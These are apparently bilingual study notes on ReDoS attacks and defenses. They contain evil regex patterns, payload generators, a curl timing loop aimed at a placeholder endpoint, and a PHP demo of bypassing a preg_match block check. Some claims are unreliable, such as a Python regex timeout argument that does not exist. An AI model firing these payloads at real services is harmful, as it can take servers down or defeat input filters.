# 🔴 Regular Expression (ReDoS) — Detailed Study Notes

> **Full Name:** Regular Expression Denial of Service
> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** শুধুমাত্র authorized system এবং lab environment এ practice করো।

---

## 📚 Table of Contents

1. [Concept — ReDoS কী?](#1-concept--redos-কী)
2. [Regex Engine কীভাবে কাজ করে](#2-regex-engine-কীভাবে-কাজ-করে)
3. [Catastrophic Backtracking — মূল সমস্যা](#3-catastrophic-backtracking--মূল-সমস্যা)
4. [Evil Regex Patterns](#4-evil-regex-patterns)
5. [Backtrack Limit — PHP PCRE](#5-backtrack-limit--php-pcre)
6. [Real-World CVE Analysis](#6-real-world-cve-analysis)
7. [ReDoS Tools](#7-redos-tools)
8. [Practical Lab Setup](#8-practical-lab-setup)
9. [Testing Methodology](#9-testing-methodology)
10. [Defense Cheat Sheet](#10-defense-cheat-sheet)
11. [References](#11-references)

---

## 1. Concept — ReDoS কী?

### Normal DoS vs ReDoS

```
Normal DoS:
  অনেক requests পাঠাও → server overwhelm হয় → crash

ReDoS (Regular Expression DoS):
  একটাই request পাঠাও → specially crafted string
  → regex engine exponentially slow হয় → CPU 100% → crash!

  মাত্র 1টা request দিয়ে server hang করানো যায়!
```

### Analogy

```
তুমি একটা দারোয়ানকে বললে:
"এই হাজার মানুষের মধ্যে 'আহমেদ মিয়া' নামের কেউ আছে কিনা দেখো"

Normal searcher:
  A থেকে শুরু → একজন একজন করে check → O(n) time

Backtracking searcher:
  "আহমেদ" নামের সবাইকে বের করো → প্রতিটার জন্য "মিয়া" check করো
  → না পেলে পিছিয়ে যাও → আবার try করো → ...
  → 2^n combinations check করে!
```

---

## 2. Regex Engine কীভাবে কাজ করে

### Basic Matching

```
Pattern: /cat/
Input:   "I have a cat"

Engine:
  position 0: 'I' → 'c' না → move
  position 1: ' ' → 'c' না → move
  ...
  position 9: 'c' → match!
  position 10: 'a' → match!
  position 11: 't' → match!
  → Found "cat"! ✅

Time: O(n) — linear, fast
```

### Backtracking

```
Pattern: /^(a+)+$/
Input:   "aaab"

Engine tries:
  Step 1: Outer group tries to match "aaab"
    Inner group: "a" → outer one iteration
    Inner group: "a" → outer two iterations
    Inner group: "a" → outer three iterations
    $ → 'b' না → FAIL!

  Step 2: Backtrack! Try different grouping:
    Inner group: "aa" + "a" → different split
    $ → 'b' না → FAIL!

  Step 3: Backtrack again!
    Inner group: "a" + "aa" → ...

  Step 4, 5, 6... exponentially more attempts!

  For "aaaaaaaaaaaaaaaaaaaab":
    2^20 = 1,048,576 combinations to try!
    → Takes minutes!
```

---

## 3. Catastrophic Backtracking — মূল সমস্যা

### What Makes Backtracking Catastrophic

```
Normal regex:         O(n)   — acceptable
Backtracking regex:   O(n²)  — slow
CATASTROPHIC:         O(2^n) — exponential = DISASTER!

Comparison:
  n=10:  2^10  = 1,024 operations
  n=20:  2^20  = 1,048,576 operations
  n=30:  2^30  = 1,073,741,824 operations (1 billion!)
  n=40:  2^40  = 1,099,511,627,776 (1 trillion!)

  Input length বাড়লে operations EXPONENTIALLY বাড়ে!
```

### Step-by-Step Catastrophic Example

```
Pattern: /(a+)+$/
Input:   "aaaab" (4 'a's + 'b')

All grouping combinations the engine tries:
(a)(a)(a)(a) → fail (b doesn't match $)
(aa)(a)(a)   → fail
(a)(aa)(a)   → fail
(a)(a)(aa)   → fail
(aaa)(a)     → fail
(a)(aaa)     → fail
(aa)(aa)     → fail
(aaaa)       → fail
... and more!

For "aaab":   ~8 attempts
For "aaaab":  ~16 attempts
For "aaaaab": ~32 attempts
For "aaaaaaaaaaaaaaaaaaab" (20 a's):
  ~1,048,576 attempts → Server hangs!
```

---

## 4. Evil Regex Patterns

### Pattern Classification

```
Evil Regex এর ৩টা condition:
  1. Grouping with repetition   → (...)+ বা (...)*
  2. Inside the group:
     a. Repetition              → a+ বা a*
     b. Alternation with overlap → a|aa বা a|a?
```

### Evil Patterns with Explanation

```
Pattern 1: (a+)+
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Outer group:  (...)+   → one or more times
Inner group:  a+        → one or more 'a'

Problem:
  "aaaa!" এর জন্য:
  Outer can split inner in MANY ways:
  (a)(a)(a)(a)
  (aa)(a)(a)
  (a)(aa)(a)
  (a)(a)(aa)
  (aaa)(a)
  (a)(aaa)
  (aa)(aa)
  (aaaa)
  → All fail on '!' → Exponential backtracking!

Attack: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
```

```
Pattern 2: ([a-zA-Z]+)*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Outer:  (...)*      → zero or more times
Inner:  [a-zA-Z]+  → one or more letters

Same problem:
  "abcde@" → engine tries all groupings of letters
  → '@' fails → massive backtracking!

Attack: "aaaaaaaaaaaaaaaaaaaaaaaa@"
```

```
Pattern 3: (a|aa)+
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Alternation overlap: 'a' OR 'aa'
  → Two choices, overlapping!
  → Engine must try both paths for each position!

Attack: "aaaaaaaaaaaaaaaaaaaa!"
```

```
Pattern 4: (a|a?)+
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'a' OR 'a?' (optional a)
  → 'a?' can match empty string!
  → Infinite loop of empty matches!

This can cause IMMEDIATE catastrophic behavior!
```

```
Pattern 5: (.*a){x} for x > 10
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
(.*a){20} = match "anything + a" exactly 20 times

For long input without enough 'a':
  Engine tries all possible splits → exponential!

Attack:
  Input: "aaaaaaaaaaaaaaaaaaaX" (no final 'a' after X)
  → Engine tries massive combinations!
```

### Attack Payload Template

```bash
# সব Evil Regex এর জন্য একই attack pattern:
# N টা 'a' + একটা failing character ('!', '@', 'X', '!')

python3 -c "print('a' * 30 + '!')"
# Output: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!

# Different failing characters:
# aaaaaaaa!   (exclamation)
# aaaaaaaa@   (at sign)
# aaaaaaaaX   (uppercase)
# aaaaaaaa#   (hash)
```

### Timing Impact Demonstration

```python
import re
import time

evil_patterns = [
    (r'(a+)+$',           'Nested quantifiers'),
    (r'([a-zA-Z]+)*$',    'Char class + star'),
    (r'(a|aa)+$',         'Overlapping alternation'),
    (r'(a|a?)+$',         'Optional alternation'),
]

print(f"{'Pattern':<25} {'Length':>6} {'Time':>10}")
print("=" * 45)

for pattern, name in evil_patterns:
    for length in [10, 15, 20, 25]:
        payload = 'a' * length + '!'
        start = time.time()
        try:
            re.match(pattern, payload)
        except Exception:
            pass
        elapsed = time.time() - start

        flag = "💀 CRITICAL" if elapsed > 2 else ("⚠️ SLOW" if elapsed > 0.5 else "✅ OK")
        print(f"{name:<25} {length:>6} {elapsed:>8.3f}s {flag}")
```

---

## 5. Backtrack Limit — PHP PCRE

### PHP Configuration

```
PHP PCRE (Perl Compatible Regular Expressions) এর limits:
┌──────────────────────┬───────────┬──────────────────────────────┐
│ Option               │ Default   │ Effect                       │
├──────────────────────┼───────────┼──────────────────────────────┤
│ pcre.backtrack_limit │ 1,000,000 │ Max backtrack steps          │
│ pcre.recursion_limit │ 100,000   │ Max recursion depth          │
│ pcre.jit             │ 1 (on)    │ JIT compilation (faster)     │
└──────────────────────┴───────────┴──────────────────────────────┘

PHP < 5.3.7:
  pcre.backtrack_limit = 100,000 (lower!)
```

### PHP ReDoS — preg_match false return

```php
<?php
// ❌ DANGEROUS — ReDoS possible:
$pattern = '/(a+)+$/';
$subject = str_repeat('a', 1000) . 'b';
// 1000 'a's + 'b' = catastrophic input!

if (preg_match($pattern, $subject)) {
    echo "Match found";
} else {
    echo "No match";  // ← Returns FALSE when backtrack limit exceeded!
}
?>
```

```
What happens:
  1. preg_match starts matching
  2. Catastrophic backtracking begins
  3. Backtrack count > 1,000,000 (limit exceeded)
  4. preg_match returns FALSE (not true/false for match!)

Problem:
  ❌ Vulnerable code: if (!preg_match($pattern, $input)) { allow(); }
  → Limit exceeded → returns false → bypass!

  Security bypass example:
  Pattern validates email format
  ReDoS input → preg_match returns false → validation "fails"
  → Attacker bypasses validation!
```

```php
// ❌ REAL VULNERABILITY — Security bypass:
function validateEmail($email) {
    $pattern = '/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/';

    if (!preg_match($pattern, $email)) {
        return false;  // invalid
    }
    return true;  // valid
}

// Attack:
// $email = str_repeat('a', 1000) . '@' . str_repeat('b', 1000) . '!';
// → preg_match returns false (limit exceeded)
// → validateEmail returns false
// → "email is invalid" → but maybe attacker wanted bypass elsewhere!

// More dangerous:
function isAllowed($input) {
    // Block malicious patterns:
    if (preg_match('/MALICIOUS_PATTERN/', $input)) {
        return false;  // blocked
    }
    return true;  // allowed
}

// ReDoS input → preg_match returns false → not "blocked" → bypassed!
```

### PHP Fix

```php
// ✅ SAFE: Check return value properly:
$result = preg_match($pattern, $subject);

if ($result === false) {
    // PCRE error! Handle it:
    $error = preg_last_error();
    error_log("PCRE error: " . preg_last_error_msg());
    // Don't allow bypass — treat as error!
    http_response_code(500);
    die("Regex processing error");
}

if ($result === 1) {
    echo "Match found";
} else {
    echo "No match";
}
```

---

## 6. Real-World CVE Analysis

### MyBB Admin Panel RCE — CVE-2023-41362

```
Platform: MyBB (popular PHP forum software)
Component: Admin Panel template system
Vulnerability: ReDoS → leads to RCE

How it happened:
  Admin Panel এ একটা feature ছিল templates validate করার
  Template validation এ vulnerable regex ছিল

  Attack chain:
  1. ReDoS payload দিয়ে preg_match bypass করো
  2. Malicious template code এর validation skip হয়
  3. Template render হয় → PHP code execute হয় → RCE!

  preg_match (ReDoS) → false return → validation bypass
  → Malicious PHP template accepted → code execution!
```

### Intigriti Challenge 1223 (CTF)

```
Platform: CTF Web Challenge
Vulnerability: ReDoS + Security bypass combination

Challenge overview:
  Web app একটা regex দিয়ে malicious input block করছে
  ReDoS input দিলে preg_match false return করে
  → Block হয় না → Flag accessible!

  Lesson: preg_match এর false return টা proper handle করো
```

### Common Real-World Vulnerable Libraries

```
Node.js packages (historical):
  ❌ moment (date parsing) → ReDoS fixed in 2.29.2
  ❌ validator.js → Various ReDoS fixes
  ❌ ua-parser-js (CVE-2021-27292) → User-Agent ReDoS
  ❌ path-to-regexp → URL routing ReDoS

npm/package ReDoS stats:
  Thousands of npm packages vulnerable to ReDoS!
  Many used in production apps!
```

---

## 7. ReDoS Tools

### Tool 1: redos-detector

```bash
# Install:
npm install -g redos-detector

# CLI usage:
redos-detector "(a+)+"
# Output:
# ✗ (a+)+ is UNSAFE
# Attack string: "aaaaaaaaa!"

redos-detector "[a-zA-Z]+"
# Output:
# ✓ [a-zA-Z]+ is safe

# Check multiple patterns:
redos-detector "(a|aa)+" "([a-z]+)*" "(a+)+"
```

### Tool 2: regexploit

```bash
# Install:
pip install regexploit

# Basic usage:
python -m regexploit "(a+)+"
# Output:
# Pattern:    (a+)+
# Prefix:
# Example:    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
# Repetitions: a (min=1)

# Check from file:
python -m regexploit --file patterns.txt

# JSON output:
python -m regexploit "(a+)+" --json
```

### Tool 3: Online Checkers

```
1. devina.io/redos-checker
   → Paste regex → Check vulnerability
   → Shows attack string!

2. regex101.com
   → Paste regex + input
   → Sees "catastrophic backtracking" warning!
   → Shows step count!

3. vuln-regex-detector (GitHub)
   → Command line tool
   → Very thorough analysis
```

### Quick Test Script

```python
#!/usr/bin/env python3
# redos_test.py — Quick ReDoS vulnerability tester

import re
import time
import sys

def test_redos(pattern, test_lengths=[10, 15, 20, 25, 30]):
    """Test if a regex is vulnerable to ReDoS"""

    print(f"\n[*] Testing pattern: {pattern}")
    print(f"{'Length':>8} {'Time':>12} {'Status':>15}")
    print("-" * 40)

    results = []
    for n in test_lengths:
        payload = 'a' * n + '!'

        start = time.time()
        try:
            re.match(pattern, payload, re.TIMEOUT if hasattr(re, 'TIMEOUT') else 0)
        except Exception:
            pass
        elapsed = time.time() - start
        results.append(elapsed)

        if elapsed > 5:
            status = "💀 CRITICAL ReDoS"
        elif elapsed > 1:
            status = "⚠️  SLOW (vulnerable)"
        elif elapsed > 0.1:
            status = "🟡 Suspicious"
        else:
            status = "✅ Safe"

        print(f"{n:>8} {elapsed:>10.4f}s {status:>15}")

    # Check exponential growth:
    if len(results) >= 3:
        growth = results[-1] / max(results[0], 0.0001)
        if growth > 100:
            print(f"\n[!] EXPONENTIAL GROWTH DETECTED! ({growth:.0f}x)")
            print("[!] This regex is VULNERABLE to ReDoS!")
        else:
            print(f"\n[+] Growth factor: {growth:.1f}x — appears safe")

# Test multiple patterns:
evil_patterns = [
    r'(a+)+$',
    r'([a-zA-Z]+)*$',
    r'(a|aa)+$',
    r'(a|a?)+$',
]

safe_patterns = [
    r'^[a-z]+$',
    r'^\d{1,10}$',
    r'^[a-z0-9_-]+$',
]

print("=" * 50)
print("EVIL PATTERNS (Expected: Vulnerable)")
print("=" * 50)
for p in evil_patterns:
    test_redos(p, [10, 15, 20, 25])

print("\n" + "=" * 50)
print("SAFE PATTERNS (Expected: Safe)")
print("=" * 50)
for p in safe_patterns:
    test_redos(p, [100, 1000, 10000])
```

---

## 8. Practical Lab Setup

### Lab 1: Python ReDoS Demo

```python
# Lab file: redos_lab.py

import re
import time

print("=" * 60)
print("ReDoS Vulnerability Demonstration")
print("=" * 60)

# ─────────────────────────────────────────
# DEMO 1: (a+)+ pattern
# ─────────────────────────────────────────
print("\n[Demo 1] Pattern: (a+)+$")
pattern = re.compile(r'(a+)+$')

for n in [5, 10, 15, 20, 25]:
    payload = 'a' * n + '!'
    start = time.time()
    pattern.match(payload)
    elapsed = time.time() - start
    bar = "█" * min(int(elapsed * 10), 50)
    print(f"  n={n:2d}: {elapsed:6.3f}s {bar}")

# ─────────────────────────────────────────
# DEMO 2: Email validation (common vulnerable pattern)
# ─────────────────────────────────────────
print("\n[Demo 2] Vulnerable Email Regex")
# This is the OWASP example — vulnerable!
vulnerable_email = re.compile(
    r'^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}'
    r'[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$'
)

# Normal email:
start = time.time()
vulnerable_email.match("user@example.com")
print(f"  Normal email: {time.time()-start:.4f}s ✅")

# Attack payload:
attack = 'a' * 50 + '@'
start = time.time()
try:
    vulnerable_email.match(attack)
except Exception:
    pass
elapsed = time.time() - start
print(f"  Attack payload (50a@): {elapsed:.4f}s {'💀' if elapsed > 1 else '⚠️'}")

# ─────────────────────────────────────────
# DEMO 3: Safe alternative
# ─────────────────────────────────────────
print("\n[Demo 3] Safe Email Regex (simplified)")
safe_email = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')

start = time.time()
safe_email.match(attack)
print(f"  Attack payload (safe regex): {time.time()-start:.6f}s ✅")
```

### Lab 2: PHP ReDoS + Bypass Demo

```php
<?php
// php_redos_lab.php

// ─────────────────────────────────────────
// Demo 1: preg_match false return
// ─────────────────────────────────────────
$pattern = '/(a+)+$/';

echo "=== PHP PCRE Backtrack Limit Demo ===\n\n";

// Normal input:
$normal = str_repeat('a', 10) . 'b';
$start = microtime(true);
$result = preg_match($pattern, $normal);
$elapsed = microtime(true) - $start;
echo "Normal (10a + b): " . var_export($result, true) . " ({$elapsed}s)\n";

// Attack input:
$attack = str_repeat('a', 100) . 'b';
$start = microtime(true);
$result = preg_match($pattern, $attack);
$elapsed = microtime(true) - $start;
echo "Attack (100a + b): " . var_export($result, true) . " ({$elapsed}s)\n";

if ($result === false) {
    echo "⚠️  preg_match returned FALSE — backtrack limit exceeded!\n";
    echo "Error: " . preg_last_error_msg() . "\n";
}

// ─────────────────────────────────────────
// Demo 2: Security bypass
// ─────────────────────────────────────────
echo "\n=== Security Bypass Demo ===\n";

function isValidInput_VULNERABLE($input) {
    // Block "dangerous" patterns:
    if (preg_match('/(a+)+$/', $input)) {
        return false;  // "dangerous"
    }
    return true;  // "safe"
}

$attack = str_repeat('a', 500) . 'b';
$result = isValidInput_VULNERABLE($attack);
echo "Attack input allowed: " . ($result ? "YES ← BYPASS!" : "no") . "\n";
// → preg_match returns false (limit exceeded) → returns true (allowed)!
?>
```

### Lab 3: Node.js ReDoS

```javascript
// node_redos_lab.js

console.log('=== Node.js ReDoS Lab ===\n')

// ❌ Vulnerable patterns:
const patterns = [
  { regex: /(a+)+$/, name: 'Nested quantifiers' },
  { regex: /([a-zA-Z]+)*$/, name: 'Char class star' },
  { regex: /(a|aa)+$/, name: 'Overlapping alternation' },
]

for (const { regex, name } of patterns) {
  console.log(`Pattern: ${name} → ${regex}`)

  for (const n of [10, 15, 20, 25]) {
    const payload = 'a'.repeat(n) + '!'
    const start = Date.now()

    try {
      regex.test(payload)
    } catch (e) {}

    const elapsed = Date.now() - start
    const status = elapsed > 1000 ? '💀 CRITICAL' : elapsed > 100 ? '⚠️ SLOW' : '✅ OK'

    console.log(`  n=${n}: ${elapsed}ms ${status}`)

    if (elapsed > 5000) {
      console.log('  → Stopping (too slow!)')
      break
    }
  }
  console.log()
}

// ✅ Safe alternative:
console.log('Safe alternative: /^[a-z]+$/')
const safePattern = /^[a-z]+$/
for (const n of [100, 1000, 10000, 100000]) {
  const payload = 'a'.repeat(n) + '!'
  const start = Date.now()
  safePattern.test(payload)
  console.log(`  n=${n}: ${Date.now() - start}ms ✅`)
}
```

---

## 9. Testing Methodology

### Step 1: Find Regex Usage in App

```
কোথায় regex ব্যবহার হতে পারে:
  ✅ Input validation (email, phone, username, URL)
  ✅ Search functionality
  ✅ Route matching (URL routing)
  ✅ Form validation (client + server side)
  ✅ API parameter validation
  ✅ File name/path validation

Signs of regex validation:
  - Error: "Invalid email format"
  - Error: "Username can only contain..."
  - Error: "Invalid URL format"
  → Server-side validation হচ্ছে → regex possible!
```

### Step 2: Craft Attack Payloads

```python
# ReDoS payload generator:
def generate_redos_payloads(char='a', lengths=[10, 20, 30, 40, 50]):
    fail_chars = ['!', '@', '#', '$', '%', '^', '&']
    payloads = []

    for length in lengths:
        for fail_char in fail_chars:
            payloads.append(char * length + fail_char)

    return payloads

# Common attack strings:
payloads = [
    'a' * 20 + '!',          # Basic
    'a' * 30 + '!',          # Longer
    'a' * 50 + '@',          # Email context
    'a@' + 'a' * 50 + '.',   # Email middle
    'A' * 20 + '!',          # Uppercase
    ('a' * 10 + 'b') * 5,    # Mixed
]
```

### Step 3: Measure Response Time

```bash
# Baseline timing:
time curl -X POST https://target.com/validate \
  -d 'email=normal@example.com'
# Baseline: ~200ms

# ReDoS payload:
time curl -X POST https://target.com/validate \
  -d 'email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@'
# Attack: if > 5000ms → vulnerable!

# Automated timing test:
for n in 5 10 15 20 25 30; do
  PAYLOAD=$(python3 -c "print('a'*$n + '@')")
  START=$(date +%s%3N)
  curl -s -X POST https://target.com/validate \
    -d "email=$PAYLOAD" > /dev/null
  END=$(date +%s%3N)
  echo "n=$n: $((END-START))ms"
done
```

### Step 4: Identify Pattern

```
Response time analysis:
  n=5:  200ms   ← baseline
  n=10: 200ms   ← similar
  n=15: 500ms   ← slightly slower
  n=20: 2000ms  ← much slower
  n=25: 8000ms  ← exponential growth!
  n=30: timeout ← server crashed!

Exponential growth → ReDoS CONFIRMED!
```

---

## 10. Defense Cheat Sheet

### ✅ Fix 1: Rewrite Evil Patterns

```python
# ❌ EVIL:
r'(a+)+'
r'([a-zA-Z]+)*'
r'(a|aa)+'

# ✅ SAFE alternatives:
r'a+'           # no grouping needed → linear!
r'[a-zA-Z]+'   # no grouping needed → linear!
r'a+'           # equivalent, safe

# ❌ EVIL Email:
r'^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@)...'

# ✅ SAFE Email (simpler):
r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
```

### ✅ Fix 2: Input Length Limit

```python
# Python:
def validate_email(email):
    # Maximum length limit করো BEFORE regex!
    if len(email) > 254:  # RFC 5321 max
        return False

    pattern = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
    return bool(pattern.match(email))
```

```javascript
// Node.js:
function validateInput(input) {
  if (input.length > 1000) {
    return false // Length limit first!
  }
  return /^[a-z0-9]+$/.test(input)
}
```

### ✅ Fix 3: Use RE2 (Linear Complexity Regex)

```python
# Python: google-re2 library (no backtracking!)
pip install google-re2

import re2

# RE2 এ catastrophic backtracking হয় না!
# কিন্তু কিছু features নেই (lookahead, backreferences)
pattern = re2.compile(r'(a+)+$')
result = pattern.match('aaaaaaaaaaaaaaaaaaaaa!')
# → Fast! RE2 = O(n) guaranteed!
```

```javascript
// Node.js: re2 package
npm install re2

const RE2 = require('re2');
const pattern = new RE2('(a+)+$');
pattern.test('aaaaaaaaaaaaaaaaaaaaa!');  // → Fast!
```

### ✅ Fix 4: Timeout for Regex

```python
# Python 3.11+ এ timeout support আছে:
import re

try:
    result = re.match(pattern, input, timeout=1.0)  # 1 second max
except TimeoutError:
    # Regex took too long → reject input
    return False
```

```php
// PHP: set_time_limit বা pcre.backtrack_limit কমাও:
ini_set('pcre.backtrack_limit', 100000);  // lower limit
ini_set('pcre.recursion_limit', 10000);

// Always check return value:
$result = preg_match($pattern, $input);
if ($result === false) {
    // Error! Don't treat as "not matched"
    http_response_code(400);
    exit("Validation error");
}
```

### ✅ Fix 5: Static Analysis in CI/CD

```yaml
# GitHub Actions example:
- name: Check for ReDoS vulnerabilities
  run: |
    npm install -g redos-detector
    # Source code থেকে regex extract করো এবং check করো
    grep -r "new RegExp\|/.*/" src/ | redos-detector
```

### Defense Summary

```
Problem                          → Fix
────────────────────────────────────────────────────────────────────────
Evil regex patterns              → Rewrite without nested quantifiers
                                   Use atomic groups or possessive quantifiers
                                   Use RE2 engine

No length limit                  → Always validate length BEFORE regex

PHP preg_match false bypass      → Check === false separately
                                   Treat as error, not "not matched"

No timeout                       → Set regex execution timeout
                                   OS-level process timeout

Unknown if regex is safe         → Use regexploit / redos-detector
                                   Static analysis in CI/CD pipeline

Complex validation regex         → Use dedicated validation libraries
                                   (validator.js, Joi, etc.)
```

---

## 11. References

| Resource              | Link                                                                                           |
| --------------------- | ---------------------------------------------------------------------------------------------- |
| PayloadsAllTheThings  | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Regular%20Expression) |
| OWASP ReDoS           | [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)  |
| redos-detector tool   | [GitHub](https://github.com/tjenkinson/redos-detector)                                         |
| regexploit tool       | [GitHub](https://github.com/doyensec/regexploit)                                               |
| devina.io checker     | [devina.io](https://devina.io/redos-checker)                                                   |
| regex101.com          | [regex101](https://regex101.com)                                                               |
| PHP PCRE Config       | [PHP Manual](https://www.php.net/manual/en/pcre.configuration.php)                             |
| CVE-2023-41362 (MyBB) | [SorceryIE Blog](https://blog.sorcery.ie/posts/mybb_acp_rce/)                                  |
| Google RE2 Library    | [GitHub](https://github.com/google/re2)                                                        |

---

> ✅ **Next Topic Suggestions:**
>
> - `Denial of Service/README.md` — ReDoS এর broader context
> - `Server Side Template Injection/README.md` — Code execution attacks
> - `SQL Injection/README.md` — Another injection class

> ⚠️ **Ethical Reminder:** ReDoS testing production system এ করলে actual downtime হতে পারে। সবসময় staging/sandbox এ test করো।
